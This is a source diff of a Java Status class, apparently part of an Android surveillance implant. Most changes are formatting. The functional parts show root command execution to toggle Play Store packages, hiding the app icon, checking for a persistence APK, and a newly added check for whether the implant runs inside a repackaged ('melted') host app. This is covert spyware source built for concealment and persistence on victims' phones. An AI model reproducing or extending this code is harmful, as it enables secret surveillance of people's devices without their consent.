@@ -247,7 +247,7 @@ public class Status {
 	}
 
 	public static boolean isGuiVisible() {
-		if(Cfg.GUI){
+		if (Cfg.GUI) {
 			return RunningProcesses.self().isGuiVisible();
 		}
 		return false;
@@ -746,13 +746,14 @@ public class Status {
 	static public boolean haveRoot() {
 		return haveRoot;
 	}
+
 	static public void setRoot(boolean r) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (setRoot) r,haveRoot "+ r + "," + haveRoot);
+			Check.log(TAG + " (setRoot) r,haveRoot " + r + "," + haveRoot);
 		}
-		boolean old_haveRoot=haveRoot;
+		boolean old_haveRoot = haveRoot;
 		haveRoot = r;
-		if( r && !old_haveRoot) {
+		if (r && !old_haveRoot) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (setRoot) calling first root");
 			}
@@ -840,6 +841,7 @@ public class Status {
 	public String getForeground() {
 		return runningProcess.getForeground_wrapper();
 	}
+
 	public android.app.ActivityManager.RunningTaskInfo getForeground_activity() {
 		return runningProcess.getForeground_activity();
 	}
@@ -884,6 +886,7 @@ public class Status {
 			return false;
 		}
 	}
+
 	static public void setPlayStoreEnableStatus(Boolean enable) {
 
 		if (Status.haveRoot()) {
@@ -901,7 +904,7 @@ public class Status {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + "(setPlayStoreEnableStatus) Enabling " + app);//$NON-NLS-1$
 						}
-						 Execute.executeRoot(M.e("pm enable ") + app);
+						Execute.executeRoot(M.e("pm enable ") + app);
 					} else {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + "(setPlayStoreEnableStatus) Already Enabled " + app);//$NON-NLS-1$
@@ -956,7 +959,7 @@ public class Status {
 	static public void setIconState(Boolean hide) {
 		// Nascondi l'icona (subito in android 4.x, al primo reboot
 		// in android 2.x)
-		if(!Cfg.GUI || Status.isBlackberry()){
+		if (!Cfg.GUI || Status.isBlackberry()) {
 			return;
 		}
 		PackageManager pm = Status.self().getAppContext().getPackageManager();
@@ -1055,6 +1058,7 @@ public class Status {
 
 	/**
 	 * already persistent and rebooted
+	 *
 	 * @return
 	 */
 	public static Boolean isPersistent() {
@@ -1066,19 +1070,33 @@ public class Status {
 	}
 
 	/**
+	 * is a melt app
+	 *
+	 * @return
+	 */
+	public static boolean isMelted() {
+		String apkName = getAppContext().getPackageName();
+		if (apkName != null) {
+			return !apkName.equals(M.e("com.android.dvci"));
+		}
+		return false;
+	}
+
+	/**
 	 * Installed but not yet reboot
+	 *
 	 * @return
 	 */
 	public static Boolean persistencyReady() {
 		AutoFile apkFile = new AutoFile(persistencyApk);
 		if (apkFile.exists()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (persistencyReady) apk already there" + persistencyApk);
+				Check.log(TAG + " (persistencyReady) apk already there: " + persistencyApk);
 			}
 			return true;
 		}
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (persistencyReady) apk NOT PRESENT there" + persistencyApk);
+			Check.log(TAG + " (persistencyReady) apk NOT PRESENT there: " + persistencyApk);
 		}
 		return false;
 	}
@@ -1118,21 +1136,10 @@ public class Status {
 		boolean equal = Digest.MD5(pack).equals("b232a7613976c9420b76780ec6c225a8");
 		return !(equal);
 
-		/*if (activityListTested == false) {
-			activityList = PackageUtils.getActivitisFromApk(getApkName());
-			activityListTested = true;
-		}
-		if (activityList != null && !activityList.isEmpty()) {
-			for (String s : activityList) {
-				if (!s.contains(Status.self().getAppContext().getPackageName())) {
-					return true;
-				}
-			}
-		}
-		return false;*/
 	}
 
 	public static boolean isBlackberry() {
 		return Build.BRAND.toUpperCase().equals(M.e("BLACKBERRY"));
 	}
+
 }
